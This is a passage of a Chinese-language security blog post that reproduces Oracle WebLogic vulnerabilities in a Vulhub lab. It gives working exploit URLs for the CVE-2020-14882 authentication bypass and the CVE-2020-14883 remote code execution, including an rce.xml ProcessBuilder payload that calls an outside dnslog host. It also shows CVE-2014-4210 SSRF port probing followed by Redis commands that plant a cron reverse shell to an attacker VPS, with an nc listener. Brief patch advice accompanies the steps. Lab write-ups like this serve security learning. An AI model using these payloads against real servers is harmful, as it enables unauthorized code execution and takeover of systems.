+&lt;li&gt;使用此 URL 绕过 Console 组件的身份验证： &lt;code&gt;http://192.168.44.132:7001/console/css/%252e%252e%252fconsole.portal&lt;/code&gt; 	&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171955685.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=FkuEz&amp;amp;originHeight=813&amp;amp;originWidth=1604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;li&gt;此时，因为是低权限用户，没有上传 webshell 的权限&lt;/li&gt;
+&lt;li&gt;第二个漏洞，CVE-2020-14883, 有以下两种利用方式&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;com.tangosol.coherence.mvel2.sh.ShellSession&lt;/code&gt; &lt;br&gt;
+1.  访问: &lt;code&gt;http://192.168.2.188:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;amp;_pageLabel=&amp;amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&amp;quot;java.lang.Runtime.getRuntime().exec(&#39;curl%20hzdjjb.dnslog.cn&#39;);&amp;quot;)&lt;/code&gt; &lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172002273.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=Kqycs&amp;amp;originHeight=951&amp;amp;originWidth=1920&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+ 2.  这种利用方法只能在 Weblogic 12.2.1 及以上版本中使用，因为 10.3.6 没有 class  &lt;code&gt;com.tangosol.coherence.mvel2.sh.ShellSession&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&lt;/code&gt;  是一种更常见的漏洞利用，首次在 CVE-2019-2725 中引入，可用于任何 Weblogic 版本&lt;br&gt;
+ 1.  要利用 &lt;code&gt;FileSystemXmlApplicationContext&lt;/code&gt;  制作一个 XML 文件并将其上传到可以访问的服务器上&lt;br&gt;
+ 2.  写入 rce.xml&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight xml&#34;&gt;&lt;figcaption data-lang=&#34;XML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token prolog&#34;&gt;&amp;lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;beans&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;xmlns&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://www.springframework.org/schema/beans&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token attr-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;xmlns:&lt;/span&gt;xsi&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://www.w3.org/2001/XMLSchema-instance&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token attr-name&#34;&gt;&lt;span class=&#34;token namespace&#34;&gt;xsi:&lt;/span&gt;schemaLocation&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;bean&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;pb&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;java.lang.ProcessBuilder&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;init-method&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;start&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;constructor-arg&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;          &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;bash&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;-c&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token cdata&#34;&gt;&amp;lt;![CDATA[curl qi9nx2.dnslog.cn]]&gt;&lt;/span&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;value&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;          &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;constructor-arg&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;bean&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;/&lt;/span&gt;beans&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;  3.  python启动服务`python3 -m http.server 8080`	![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172006564.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=jo090&amp;amp;originHeight=203&amp;amp;originWidth=684&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172007095.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=EiFgN&amp;amp;originHeight=665&amp;amp;originWidth=1604&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+4.  访问 &lt;code&gt;http://192.168.2.188:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;amp;_pageLabel=&amp;amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&amp;quot;http://example.com/rce.xml&amp;quot;)&lt;/code&gt;  Weblogic 将加载此 XML 并执行其中的命令&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210172012676.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=g9kHl&amp;amp;originHeight=630&amp;amp;originWidth=1205&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+ 5.  该漏洞利用的缺点是：它要求 Weblogic 服务器能够访问恶意 XML。&lt;/p&gt;
+&lt;h3 id=&#34;修复建议-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修复建议-5&#34;&gt;#&lt;/a&gt; 修复建议&lt;/h3&gt;
+&lt;p&gt;此次 Oracle 官方的 CPU 已发布了针对该漏洞的补丁，请受影响用户及时下载补丁程序并安装更新。&lt;br&gt;
+及时更新补丁，参考 oracle 官网发布的补丁:&lt;br&gt;
+ 注：Oracle 官方补丁需要用户持有正版软件的许可账号，使用该账号登陆后，可以下载最新补丁&lt;/p&gt;
+&lt;h2 id=&#34;ssrfcve-2014-4210&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrfcve-2014-4210&#34;&gt;#&lt;/a&gt; ssrf(CVE-2014-4210)&lt;/h2&gt;
+&lt;h3 id=&#34;漏洞概述-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞概述-6&#34;&gt;#&lt;/a&gt; 漏洞概述&lt;/h3&gt;
+&lt;p&gt;Oracle WebLogic Server 是美国甲骨文（Oracle）公司的一款适用于云环境和传统环境的应用服务器，它提供了一个现代轻型开发平台，支持应用从开发到生产的整个生命周期管理，并简化了应用的部署和管理.&lt;/p&gt;
+&lt;p&gt;Oracle Fusion Middleware 10.0.2.0 和 10.3.6.0 版本的 Oracle WebLogic Server 组件中的 WLS - Web Services 子组件存在安全漏洞。远程攻击者可利用该漏洞读取数据，影响数据的保密性.&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;类型&lt;/th&gt;
+&lt;th&gt;描述&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;漏洞名称&lt;/td&gt;
+&lt;td&gt;Oracle WebLogic Server SSRF 漏洞&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;威胁类型&lt;/td&gt;
+&lt;td&gt;SSRF&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;威胁等级&lt;/td&gt;
+&lt;td&gt;中&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;漏洞 ID&lt;/td&gt;
+&lt;td&gt;CVE-2014-4210&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;受影响系统及应用版本&lt;/td&gt;
+&lt;td&gt;weblogic 10.0.2 – 10.3.6&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;服务端请求伪造 (Server-Side Request Forgery), 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统.&lt;br&gt;
+SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容、加载指定地址的图片、文档等等&lt;/p&gt;
+&lt;h3 id=&#34;漏洞复现-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞复现-6&#34;&gt;#&lt;/a&gt; 漏洞复现&lt;/h3&gt;
+&lt;p&gt;SSRF 漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现在这个请求是合法的，然后服务器以他的身份来访问其他服务器的资源.&lt;/p&gt;
+&lt;p&gt;以下演示的 Weblogic 中 靶场环境就是由于访问目标网站是的参数是 URL , 且在服务端验证请求时没有对用户请求做出严格的过滤以及限制，导致存在 SSRF 漏洞，可以获取服务器一定量的数据。同时可以进一步实现篡改获取的资源并发送给服务器，下面是通过 6379 端口访问服务器的 redis 服务，并篡改了  &lt;code&gt;/etc/crontab&lt;/code&gt;  下的信息，将反弹 Shell 的脚本写入了该目录下从而获得 Shell.&lt;/p&gt;
+&lt;h4 id=&#34;靶场搭建-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#靶场搭建-2&#34;&gt;#&lt;/a&gt; 靶场搭建&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;直接在 Centos 虚拟机基于 Vulhub 漏洞集成环境生成靶场.&lt;/li&gt;
+&lt;li&gt;进入 Vulhub 对应的漏洞路径下执行命令 &lt;code&gt;docker-compose up -d&lt;/code&gt;  编译并运行靶场容器&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;docker ps&lt;/code&gt;  查看端口&lt;/li&gt;
+&lt;li&gt;访问 &lt;code&gt;http://192.168.164.128:7001/uddiexplorer&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h4 id=&#34;端口探测&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口探测&#34;&gt;#&lt;/a&gt; 端口探测&lt;/h4&gt;
+&lt;p&gt;SSRF 漏洞存在于 &lt;code&gt;http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp&lt;/code&gt; , 仔细查看发现这里有参数传入的是 URL, 差不多可以断定就是在这个点存在 SSRF 漏洞了&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171403974.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=mI71R&amp;amp;originHeight=1079&amp;amp;originWidth=1920&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+在 BurpSuite 下抓包测试该漏洞，查询请求的 operator 参数可以进行端口探测，当我们输入不同值时可得到多种不同的报错信息&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171405123.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=nvqrs&amp;amp;originHeight=1079&amp;amp;originWidth=1920&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171405802.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=BZcpK&amp;amp;originHeight=1079&amp;amp;originWidth=1920&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+通过 &lt;code&gt;docker inspect 容器ID&lt;/code&gt;  命令查看并确认 redis 服务的容器 IP 地址：&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171412003.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=bWXgk&amp;amp;originHeight=573&amp;amp;originWidth=1391&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171413591.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=iaVxO&amp;amp;originHeight=590&amp;amp;originWidth=1001&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+然后访问 &lt;code&gt;http://172.20.0.2:6379&lt;/code&gt;  返回非 HTTP 协议的报错信息，是因为运行着 redis 服务&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171415851.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=Bxbf8&amp;amp;originHeight=1079&amp;amp;originWidth=1920&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+以上通过 SSRF 漏洞探测内网中的 redis 服务器 (docker 环境的网段一般是 172.*) 可以通过写脚本或者 BURP 爆破内网服务，现在已经发现 &lt;code&gt;172.19.0.2:6379&lt;/code&gt;  可以连通.&lt;/p&gt;
+&lt;h4 id=&#34;反弹shell-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell-3&#34;&gt;#&lt;/a&gt; 反弹 Shell&lt;/h4&gt;
+&lt;p&gt;接下来就是发送三条 redis 命令，将反弹 shell 的脚本写入目录 &lt;code&gt;/etc/crontab&lt;/code&gt; （这个目录下是一个默认自动执行的一些 crontab 定时服务命令，里面都写的是一些开启服务的命令）：&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;set&lt;/span&gt; 1 &lt;span class=&#34;token string&#34;&gt;&#34;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#39;sh -i &gt;&amp;amp; /dev/tcp/evil/YOUR-VPS-IP/6666 0&gt;&amp;amp;1&#39;\n\n\n\n&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;config &lt;span class=&#34;token function&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;dir&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;etc/&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;config &lt;span class=&#34;token function&#34;&gt;set&lt;/span&gt; dbfilename crontab&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;save&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;命令分析：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;命令行&lt;/th&gt;
+&lt;th&gt;释义&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;set 1 …&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;将 &lt;code&gt;bash shell&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;设置为变量 &amp;quot;1&amp;quot; 的 &lt;code&gt;value&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;值，执行一个反弹 &lt;code&gt;shell&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;,IP 为 VPS-IP&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;set dir /etc/&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;建立一个工作目录&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;code&gt;config set dbfilename crontab&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;创建一个 RDB 备份文件，文件名 &lt;code&gt;crontab&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;; 所有的 RDB 文件都会储存在 &lt;code&gt;etc/crontab&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;下&lt;/td&gt;
+&lt;td&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Redis: 是一个 key-value 型数据库，信息以键对应值的关系储存在内存中，而它算不上是一个真正的数据库，因为 redis 是主要把信息数据存储在内存中 (当然也可以把其存储在硬盘上，这也是写 shell 的必要条件之一).Redis 将数据主要保存在内存中，我们可以随时执行 &lt;code&gt;save&lt;/code&gt;  命令将当前的 redis 数据保存到硬盘上。另外 redis 也会根据配置自动存储数据到硬盘上，这不得不说到 redis 的 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZGlzLmlvL3RvcGljcy9wZXJzaXN0ZW5jZQ==&#34;&gt;持久化运作方案&lt;/span&gt;，其中说到的一个 RDB, 一个 AOF.RDB 更像一个数据库备份文件，而 AOF 是一个 log 日志文件。我们可以设置让 redis 再指定时间、指定更改次数时进行备份，生成 RDB 文件；而设置 AOF, 可以在操作或时间过程后将 &amp;quot;日志&amp;quot; 写入一个文件的最末，当操作越来越多，则 AOF 文件越来越大。二者是相辅相成的，通过二者的配合我们能够稳定地持久地将数据存储于服务器上.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;首先对以上三条 redis 命令进行 url 编码&lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171436175.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=au0Ps&amp;amp;originHeight=753&amp;amp;originWidth=1004&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;li&gt;VPS 中监听端口 &lt;code&gt;nc -lvvp 6666&lt;/code&gt; &lt;br&gt;
+&lt;img data-src=&#34;https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210171438766.png#crop=0&amp;amp;crop=0&amp;amp;crop=1&amp;amp;crop=1&amp;amp;id=eXofp&amp;amp;originHeight=76&amp;amp;originWidth=362&amp;amp;originalType=binary&amp;amp;ratio=1&amp;amp;rotation=0&amp;amp;showTitle=false&amp;amp;status=done&amp;amp;style=none&amp;amp;title=&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
+&lt;li&gt;将下方中的 &lt;code&gt;YOUR-VPS-IP&lt;/code&gt;  替换为你的 VPS-IP&lt;/li&gt;
+&lt;/ol&gt;
